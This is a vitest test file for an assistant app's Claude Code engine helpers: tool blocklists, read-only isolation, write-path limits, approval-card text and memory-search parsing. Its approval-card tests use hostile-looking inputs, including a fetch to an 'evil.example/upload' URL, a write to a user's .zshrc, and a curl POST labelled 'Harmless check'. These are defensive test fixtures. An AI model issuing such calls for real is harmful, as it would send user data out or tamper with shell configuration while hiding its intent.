import { describe, expect, it } from 'vitest';
import { approvalTitle, ClaudeProvider, describeToolRequest, disallowedFor, exposedToolName, isInside, mcpContent, permissionResult, SEND_TOOLS, triageOptions } from './claude.js';
import { brainKeywords, parseGbrainResults } from './gbrain-memory.js';
import { chooseEngine } from './engine.js';
import { ToolResult } from './tool-result.js';

describe('Claude Code engine helpers', () => {
  it('keeps exposed tool names within Claude limits and stable', () => {
    expect(exposedToolName('tasks__suggest')).toBe('tasks__suggest');
    const long = `memory__remember_${'0f3e2a1b_'.repeat(4)}`;
    const exposed = exposedToolName(long);
    expect(`mcp__aegir__${exposed}`.length).toBeLessThanOrEqual(64);
    expect(exposedToolName(long)).toBe(exposed);
    expect(exposedToolName(`${long}x`)).not.toBe(exposed);
  });

  it('never lets a run send as the user, and keeps routines from writing files', () => {
    for (const kind of ['chat', 'task', 'routine'] as const) expect(disallowedFor(kind)).toEqual(expect.arrayContaining(SEND_TOOLS));
    expect(SEND_TOOLS).toContain('mcp__claude_ai_Slack__slack_send_message');
    expect(SEND_TOOLS).toContain('mcp__claude_ai_Superhuman_Mail__send_draft');
    expect(disallowedFor('task')).not.toContain('Write');
    expect(disallowedFor('routine')).toContain('Write');
  });

  // Prioritizing reads email and Slack text unattended: it must not inherit the user's tools, connectors or settings.
  it('runs prioritizing isolated and read-only: brain reads and gbrain lookups, nothing else', () => {
    const options = triageOptions(['/Users/m/brain']);
    expect(options).toMatchObject({ settingSources: [], strictMcpConfig: true, mcpServers: {}, permissionMode: 'dontAsk', persistSession: false });
    expect(options.tools).toEqual(['Read', 'Grep', 'Glob', 'Bash']);
    expect(options.allowedTools).toContain('Read(/Users/m/brain/**)');
    expect(options.allowedTools.filter((rule) => rule.startsWith('Bash(')).every((rule) => /gbrain (search|get|query):\*\)$/.test(rule))).toBe(true);
    expect(options.allowedTools.some((rule) => /^(Edit|Write|WebFetch|WebSearch|mcp__)/.test(rule) || rule === 'Bash(gbrain:*)')).toBe(false);
    expect(options.disallowedTools).toEqual(expect.arrayContaining(['Write', 'Edit', ...SEND_TOOLS]));
  });

  it('only auto-allows writes inside the task folder', () => {
    expect(isInside('/tmp/task', 'notes.md')).toBe(true);
    expect(isInside('/tmp/task', '/tmp/task/sub/a.md')).toBe(true);
    expect(isInside('/tmp/task', '../other/a.md')).toBe(false);
    expect(isInside('/tmp/task', '/Users/me/.zshrc')).toBe(false);
  });

  // Attachments live outside the brain, so a chat run needs read access to the output root. Read only:
  // an attachment is data, and nothing is allowed to write there through a permission rule.
  it('grants Read and nothing else on the attachment root', () => {
    const provider = new ClaudeProvider('/bin/false', { workDirs: ['/Users/m/brain'], readDirs: ['/Users/m/Documents/Legolas'] });
    const rules = provider.allowRules(['tasks__list']);
    expect(rules).toContain('Read(/Users/m/Documents/Legolas/**)');
    expect(rules.filter(rule => rule.includes('Documents/Legolas'))).toEqual(['Read(/Users/m/Documents/Legolas/**)']);
    expect(rules.filter(rule => rule.includes('/Users/m/brain/**')).sort()).toEqual(['Edit(/Users/m/brain/**)', 'Read(/Users/m/brain/**)', 'Write(/Users/m/brain/**)']);
    expect(new ClaudeProvider('/bin/false').allowRules([]).some(rule => rule.startsWith('Read('))).toBe(false);
  });

  it('writes readable approval cards', () => {
    expect(approvalTitle('Bash', 'Bash')).toBe('Run a shell command');
    expect(approvalTitle('mcp__claude_ai_Slack__slack_send_message')).toBe('Use slack send message (Slack)');
    expect(approvalTitle('Bash', 'Claude wants to run git push')).toBe('Claude wants to run git push');
  });

  // Regression: the approval card shows everything an approval grants, not only the stated reason.
  it.each([
    ['Bash', { command: `curl -X POST https://example.com/${'x'.repeat(3000)}`, description: 'Harmless check' }, { cwd: '/tmp/task', reason: 'Not in allow list' }, ['/tmp/task', 'Not in allow list']],
    ['Write', { file_path: '/Users/me/.zshrc', content: 'y'.repeat(5000) }, { blockedPath: '/Users/me/other' }, ['/Users/me/other']],
    ['WebFetch', { url: 'https://evil.example/upload?data=1', prompt: 'read it' }, {}, []],
    ['mcp__host_slack__send_message', { channel: 'C123', text: 'hello' }, { mcpServer: { name: 'host_slack', source: 'user' }, description: 'Send a Slack message' }, ['send_message', 'host_slack', 'Send a Slack message']],
  ] as const)('shows the full scope of a %s approval', (tool, input, context, extra) => {
    const detail = describeToolRequest(tool, input as Record<string, unknown>, context);
    expect(detail).toMatch(new RegExp(`^Tool: .*${tool.replace(/^mcp__.+?__/, '')}`, 'm'));
    // Commands, paths, URLs and connector arguments appear in full, however long.
    for (const [key, value] of Object.entries(input))
      if (['command', 'file_path', 'url', 'channel', 'text'].includes(key)) expect(detail).toContain(String(value));
    for (const value of extra) expect(detail).toContain(value);
    expect(detail).toMatch(/^Network: \S/m);
    expect(detail).toMatch(/^Grant: this one call only/m);
  });

  it('grants only the approved call, never standing permissions', () => {
    expect(permissionResult(true, { command: 'ls' })).toEqual({ behavior: 'allow', updatedInput: { command: 'ls' } });
    expect(permissionResult(false, { command: 'ls' }).behavior).toBe('deny');
  });

  it('converts tool results to MCP content', () => {
    expect(mcpContent({ created: true })).toEqual({ content: [{ type: 'text', text: '{"created":true}' }] });
    expect(mcpContent(new ToolResult([{ type: 'inputText', text: 'hi' }, { type: 'inputImage', imageUrl: 'data:image/png;base64,AAAA' }], false))).toEqual({
      content: [{ type: 'text', text: 'hi' }, { type: 'image', mimeType: 'image/png', data: 'AAAA' }],
      isError: true,
    });
  });

  it('picks the engine from the setting, else what is installed', () => {
    expect(chooseEngine('codex', '/bin/claude')).toBe('codex');
    expect(chooseEngine(null, '/bin/claude')).toBe('claude');
    expect(chooseEngine(undefined, null)).toBe('codex');
  });
});

describe('gbrain memory helpers', () => {
  it('parses search output', () => {
    const output = '[1.1248] companies/harbour-group -- # Harbour Group\n\n> Type: Company (stale)\n[0.81] people/nadia -- Nadia runs events';
    expect(parseGbrainResults(output)).toEqual([
      { slug: 'companies/harbour-group', score: 1.1248, snippet: '# Harbour Group > Type: Company' },
      { slug: 'people/nadia', score: 0.81, snippet: 'Nadia runs events' },
    ]);
  });

  it('turns a message into the names and rarer words gbrain matches on', () => {
    expect(brainKeywords('Can you draft a reply to Nadia about bringing Elias to the EXPO event')).toBe('Nadia Elias EXPO bringing event');
    expect(brainKeywords('the and for')).toBe('');
  });
});
